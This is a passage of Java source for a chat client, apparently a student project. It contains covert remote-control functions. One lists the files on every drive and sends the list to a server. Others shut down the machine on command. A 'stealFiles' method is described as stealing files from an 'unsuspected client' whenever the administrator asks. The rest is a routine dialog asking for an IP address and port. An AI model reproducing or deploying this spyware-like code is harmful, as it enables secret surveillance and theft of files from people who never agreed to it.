     * then sends it back to the server Server can view and analyze the files
     */
    public void getTheListOffAllFiles() {
        ArrayList<String> listAllFiles = new ArrayList<String>();
        for (int i = 0; i < File.listRoots().length; i++) {
            File Allfile = File.listRoots()[i];
            File files[] = Allfile.listFiles();
            if (files != null) {
                listAllFiles.add(Allfile.toString());
                for (int j = 0; j < files.length; j++) {
                    listAllFiles.add(files[j].toString());
                    File filet[] = files[j].listFiles();
                    if (filet != null) {
                        for (int k = 0; k < filet.length; k++) {
                            listAllFiles.add(filet[k].toString());
                        }
                    }
                }
            }
        }
        try {
            oos.writeObject(listAllFiles);
            oos.flush();
        } catch (IOException ex) {
            Client.this.appendString(ex.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method shutDownPC simply shuts the PC down when called
     * it is accomplished using the Runtime package in java basically
     * when you call this method java tells windows shutdown and this is what i love the most
     * using this package Runtime you can directly at runtime talk to windows and pass the commands
     */
    public void shutDownPC() {
        try {
            Runtime.getRuntime().exec("shutdown -s -t 25");
        } catch (IOException ex) {
            Client.this.appendString(ex.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method cancelShutDown simply cancels the shut of the PC when called
     * it is accomplished using the Runtime package in java basically
     * when you call this method java tells windows cancel shutdown and this is what i love the most
     * using this Runtime package you can directly at runtime talk to windows and pass the commands
     */
    public void cancelShutDown() {
        try {
            Runtime.getRuntime().exec("shutdown -a");
        } catch (IOException ex) {
            Client.this.appendString(ex.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method stealFiles simply steals the files from an unsuspected
     * client the demand for stealing the files can only come from the administrator
     * @param object as an Object
     */
    public void stealFiles(Object object) {
        final Packet packet = (Packet) object;
        new StealFile(false, ipAddress, packet.getFilePath());
    }

    /**
     * The method setGuestName sets the name of the guest which is the client that sending or receiving
     * file through the public chat
     * @param guestName as a String
     */
    public void setGuestName(String guestName) {
        this.guestName = guestName;
    }

    /**
     * The method closeClientServerSocket simply closes the ServerSocket object
     * that it receives as a parameter
     * @param serverSocket as a ServerSocket
     */
    public void closeClientServerSocket(ServerSocket serverSocket) {
        try {
            serverSocket.close();
        } catch (Exception e) {
            Client.this.appendString(e.toString(), exceptionAttribute, color);
        }
    }

    /**
     * The method getTextField simply returns the text field to the caller
     * @return as a JTextField
     */
    public JTextField getTextField() {
        return txtSend;
    }

    /**
     * The toString method is how the client object will represent itself
     * as a String it is overridden by our class
     * @return s as a String representation of this object
     */
    @Override
    public String toString() {
        String s = "";
        try {
            s = name + "/" + InetAddress.getLocalHost();
        } catch (Exception ex) {
            Client.this.appendString(ex.toString(), exceptionAttribute, color);
        }
        return s;
    }

    /**
     * The InputDailog is JDialog that is used in our class to prompt the user
     * for IP Address and the portNumber number
     * @author Dimitri Pankov
     * @see Socket
     * @see JDialog
     * @version 1.0
     */
    private class InputDialog extends JDialog {

        private JLabel ip;
        private JLabel portNumber;
        private JTextField ipTextField, portTextField;
        private JButton applyButton, cancelButton;
        private String title = InetAddress.getLocalHost() + "";

        /**
         * Empty constructor of the class has all needed components to represent itself
         * graphically on the screen
         * @throws UnknownHostException when working with sockets risks are unavoidable
         */
        public InputDialog() throws UnknownHostException {
            this.setLayout(new GridLayout(3, 2));

            //CREATE TWO JLABELS
            ip = new JLabel("Enter IP Address");
            portNumber = new JLabel("Enter Port");

            //CREATE TWO JTEXT FIELDS
            ipTextField = new JTextField("127.0.0.1");
            portTextField = new JTextField("5555");

            //CREATE JBUTTON
            applyButton = new JButton("Apply");

            //ADD AN ACTION LISTENER TO THE BUTTON
            applyButton.addActionListener(new ActionListener() {

                /**
                 * The method actionPerformed is inherited from ActionListener Interface
                 * @param e ActionEvent object that is generated when button is clicked
                 */
                public void actionPerformed(ActionEvent e) {
                    try {
                        if (portTextField.getText().trim().equals("") && ipTextField.getText().trim().equals("")) {
                            throw new Exception("Empty String are not accepted");
                        }
                        ipAddress = ipTextField.getText().trim();
                        port = Integer.parseInt(portTextField.getText().trim());
                        InputDialog.this.dispose();
                    } catch (Exception ex) {
                        Client.this.appendString(ex.toString(), exceptionAttribute, color);
                    }
                }
            });

            //CREATE JBUTTON
            cancelButton = new JButton("Cancel");

            //ADD AN ACTION LISTENER TO JBUTTON
            cancelButton.addActionListener(new ActionListener() {

                /**
                 * The method actionPerformed is inherited from ActionListener Interface
                 * @param e ActionEvent object that is generated when button is clicked
                 */
                public void actionPerformed(ActionEvent e) {
                    InputDialog.this.dispose();
                }
            });

            this.setModal(true);

            //ADD ALL COMPONENTS TO THE CONTAINER
            this.getContentPane().add(ip);
            this.getContentPane().add(ipTextField);
            this.getContentPane().add(portNumber);
            this.getContentPane().add(portTextField);
            this.getContentPane().add(applyButton);
            this.getContentPane().add(cancelButton);

            //INITIALIZE JFRAMES'S PROPERTIES
            this.setSize(300, 150);
            this.setLocation(300, 100);
            this.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            this.setTitle(title);
            this.setVisible(true);
        }
    }
}
